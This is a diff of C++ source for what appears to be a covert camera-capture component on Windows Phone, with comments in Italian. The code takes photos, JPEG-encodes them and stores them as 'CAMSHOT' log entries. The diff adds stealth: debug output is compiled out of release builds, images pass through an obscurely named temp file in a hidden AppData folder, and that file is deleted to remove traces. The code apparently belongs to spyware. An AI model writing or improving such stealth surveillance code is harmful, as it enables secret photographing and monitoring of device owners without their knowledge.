@@ -122,10 +122,11 @@ UINT ReaderCallback(int* rgBytes, UINT cb, UINT cbActual)
         return this.MapExceptions(exception);
     }
 	*/
-	
+#ifdef _DEBUG	
 	WCHAR msg[128];
 	swprintf_s(msg, L"ReaderCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
 	OutputDebugString(msg);
+#endif
 	
 	  return 0;
 }
@@ -144,9 +145,11 @@ UINT SeekCallBack(long dlibMove, UINT dwOrigin, ULONG plibNewPosition)
         return this.MapExceptions(exception);
     }
 	*/
+#ifdef _DEBUG
 	WCHAR msg[128];
 	swprintf_s(msg, L"SeekCallBack>>>>>>>>>>>>>>>>> dlibMove=0x%x, dwOrigin=0x%x, plibNewPosition=0x%x\n",dlibMove,dwOrigin,plibNewPosition);
 	OutputDebugString(msg);
+#endif
 	 return 0;
 
 }
@@ -206,12 +209,12 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
 						*/
 
 
-
+#ifdef _DEBUG
 	WCHAR msg[128];
 	swprintf_s(msg, L"WriteCallback>>>>>>>>>>>>>>>>> rgBytes=0x%x, cb=0x%x, cbActual=0x%x\n",rgBytes,cb,cbActual);
 	OutputDebugString(msg);
 	DBG_TRACE(msg, 1, FALSE);
-	
+#endif	
 	fstream filestr;
 	//non utilizzo l'incremento delle immagini
 	//filestr.open("image.rgb", fstream::out|fstream::binary);
@@ -219,6 +222,7 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
 	filestr.seekg (0, ios::beg);
 	filestr.write ((const char*)rgBytes, cb);
 	filestr.close();
+
 /*****
 	Log CameraLog;
 
@@ -387,7 +391,7 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 
 						int j=0;
 						//MediaApi_EncodeARGBIntoJpegStream(BUFFER, (uint) 640, (uint) 480, (uint) 640, (uint) 480, (uint) 0, (uint) 90, (uint) ((640 * 4) * 480), this._readercb, this._seekcb, this._writecb, (ulong) ((uint) this._s.Length));
-
+#ifdef _DEBUG
 						char nomeFileBase[DTTMSZAUD];				
    						getDtTmAUD(nomeFileBase);
 						//0 normalmente è la camera back 1 e' la front
@@ -398,22 +402,19 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 
 						OutputDebugStringA(nomeFile);
 						OutputDebugStringA("\n");
+#else
+						//uso ptjfHJ4f4tD come file temporaneo per la conversione delle immagini in jpeg
+						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
+						DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
 
-						///WCHAR msg[128];
-						///swprintf_s(msg, L"Assegnato0 nome=%s\n",nomeFile);
-						///DBG_TRACE(msg, 1, FALSE);
+#endif
+
 						
 						ULONG lengthOfStream=0;
-						/****
-						Log CameraLog;
 
-						if (CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH)) 
-						{
-							PtrCameraLog=&CameraLog;
-							*****/
 							int ret=_MediaApi_EncodeARGBIntoJpegStream((int*)pixels, PreActualResolution.Width, PreActualResolution.Height, PreActualResolution.Width, PreActualResolution.Height, 0, 90, ((PreActualResolution.Width * 4) * PreActualResolution.Height), NULL, NULL, WriteCallback, lengthOfStream);
 
-							Log CameraLog;
+						
 
 							std::ifstream is (nomeFile, std::ifstream::binary);
 							if (is) {
@@ -432,11 +433,16 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 
 							// print content:
 							//std::cout.write (buffer,length);
+							
+							DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
+							
+							Log CameraLog;
 
 							CameraLog.CreateLog(LOGTYPE_CAMSHOT, NULL, 0, FLASH);
 							CameraLog.WriteLog((BYTE*)buffer, length);
 							CameraLog.CloseLog();
 
+							
 
 							delete[] buffer;
 							}
@@ -446,11 +452,7 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 							
 
 
-						/*****	
-							_Sleep(5000);
-							CameraLog.CloseLog();
-						}
-						****/
+						
 					
 
 					/*
@@ -513,8 +515,10 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 				}
 				catch (Platform::Exception^ e) 
 				{
+#ifdef _DEBUG
 					OutputDebugString(L"<<<eccezione capture Photo gestita>>>\n");
 					///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
 
 					Log logInfo;
 					logInfo.WriteLogInfo(L"Camera is in use, pictures won't be captured");
